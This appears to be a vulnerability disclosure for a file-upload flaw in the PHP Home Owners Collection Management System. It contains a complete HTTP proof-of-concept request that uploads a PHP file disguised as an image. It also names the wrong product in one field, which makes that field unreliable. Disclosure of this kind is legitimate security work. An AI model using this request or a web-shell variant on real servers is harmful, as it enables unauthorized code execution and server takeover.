
Web shell via File upload functionality in Home owners collection management system

Description: Web shell via file upload functionality in Home Owners Collection Management System from Sourcecodester website.

[Vulnerability Type] Web shell via file upload functionality.

[Vendor of Product] https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html

[Affected Product Code Base] Student Attendance Management System

[Affected Component] http://localhost/hocms/classes/Users.php?f=save

[Attack Type] Remote

[Impact Information Disclosure] true

[Attack Vectors] Steps to reproduce:
Navigate to the url http://localhost/hocms/classes/Users.php?f=save

Malicious files can be uploaded to the target server through the following POC

```
POST /hocms/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------30759839707972018371739994671
Content-Length: 912
Origin: http://localhost
Connection: close
Referer: http://localhost/hocms/admin/?page=user/manage_user&id=7
Cookie: PHPSESSID=gvqin8eud72gen7qgf6sots4n0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="id"

7
-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="firstname"

Claire
-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="lastname"

Blake
-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="username"

cblake
-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="password"


-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="type"

2
-----------------------------30759839707972018371739994671
Content-Disposition: form-data; name="img"; filename="1.php"
Content-Type: image/x-icon

<?php phpinfo();?>
-----------------------------30759839707972018371739994671--
```
<img width="1264" alt="image" src="https://github.com/GAO-UNO/cve/assets/131429880/b52f2262-442c-4406-a2f9-8ef65a2c5c8d">

Access the target server malicious file 1.php

<img width="1229" alt="image" src="https://github.com/GAO-UNO/cve/assets/131429880/d695b66b-0e32-49fe-8daf-b420b792bfea">


